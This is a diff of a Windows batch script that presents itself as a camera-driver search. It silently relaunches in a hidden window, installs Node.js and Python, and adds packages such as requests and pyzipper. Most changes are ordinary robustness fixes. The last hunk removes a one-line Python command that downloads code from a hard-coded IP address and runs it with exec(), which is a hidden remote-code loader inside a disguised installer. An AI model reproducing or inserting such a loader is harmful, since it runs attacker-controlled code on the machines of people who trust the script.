@@ -11,46 +11,53 @@ echo [INFO] Searching for Camera Drivers ...
 
 :: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
-REM Get latest Node.js version using PowerShell
-for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
-
-REM Remove leading "v"
-set "NODE_VERSION=%LATEST_VERSION:~1%"
-set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
-set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "EXTRACT_DIR=%~dp0nodejs"
 set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
 set "NODE_EXE="
+set "NODE_VERSION="
+set "LATEST_VERSION="
 
-:: -------------------------
-:: Check for global Node.js
-:: -------------------------
+:: Check global / portable Node FIRST — do not call nodejs.org until we need an MSI (avoids hang on Invoke-RestMethod).
 where node >nul 2>&1
 if not errorlevel 1 (
     for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
     set "NODE_EXE=node"
+    echo [INFO] Using installed Node.js !NODE_INSTALLED_VERSION!
 )
 
-if not defined NODE_EXE (
-    if exist "%PORTABLE_NODE%" (
-        set "NODE_EXE=%PORTABLE_NODE%"
-        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else (
+if not defined NODE_EXE if exist "%PORTABLE_NODE%" (
+    set "NODE_EXE=%PORTABLE_NODE%"
+    set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
+    echo [INFO] Using portable Node.js at %PORTABLE_NODE%
+)
 
-    REM -------------------------
-    REM Download Node.js MSI if needed
-    REM -------------------------
+REM Only fetch dist/index.json when we still have no Node ^(must download MSI^). Timeout prevents indefinite hang.
+if not defined NODE_EXE (
+    echo [INFO] Resolving latest Node.js from nodejs.org ^(max 45s^)...
+    for /f "delims=" %%v in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; try { $r=Invoke-RestMethod -Uri 'https://nodejs.org/dist/index.json' -TimeoutSec 45; $r[0].version } catch { exit 1 }"') do set "LATEST_VERSION=%%v"
+    if "!LATEST_VERSION!"=="" (
+        echo [ERROR] Could not reach nodejs.org to read latest Node version. Check network, firewall, or proxy.
+        exit /b 1
+    )
+    set "NODE_VERSION=!LATEST_VERSION:~1!"
+    set "NODE_MSI=node-v!NODE_VERSION!-x64.msi"
+    set "DOWNLOAD_URL=https://nodejs.org/dist/v!NODE_VERSION!/!NODE_MSI!"
+    set "MSI_OUT=%~dp0!NODE_MSI!"
+
+    echo [INFO] Downloading Node.js installer...
     where curl >nul 2>&1
     if errorlevel 1 (
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'" >nul 2>&1
+        powershell -NoProfile -Command "Invoke-WebRequest -Uri \"!DOWNLOAD_URL!\" -OutFile \"!MSI_OUT!\"" >nul 2>&1
     ) else (
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
+        curl -s -L --connect-timeout 30 --max-time 600 -o "!MSI_OUT!" "!DOWNLOAD_URL!"
     )
 
-    if exist "%~dp0%NODE_MSI%" (
-        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
-        del "%~dp0%NODE_MSI%"
+    if exist "!MSI_OUT!" (
+        echo [INFO] Extracting Node.js...
+        msiexec /a "!MSI_OUT!" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
+        del "!MSI_OUT!"
     ) else (
+        echo [ERROR] Node.js MSI download failed.
         exit /b 1
     )
 
@@ -58,8 +65,8 @@ if not defined NODE_EXE (
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
     ) else (
+        echo [ERROR] Node.exe not found after MSI admin install. Expected: %PORTABLE_NODE%
         exit /b 1
-    )
     )
 )
 
@@ -67,6 +74,7 @@ if not defined NODE_EXE (
 :: Confirm Node.js works
 :: -------------------------
 if not defined NODE_EXE (
+    echo [ERROR] Node.js is not available after setup.
     exit /b 1
 )
 :: -------------------------
@@ -103,7 +111,6 @@ if exist "%CODEPROFILE%\env-setup.npl" (
     C:\python\python.exe C:\python\get-pip.py >nul 2>&1
     C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
 
-    C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='3-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
     if errorlevel 1 (
         exit /b 1
     )
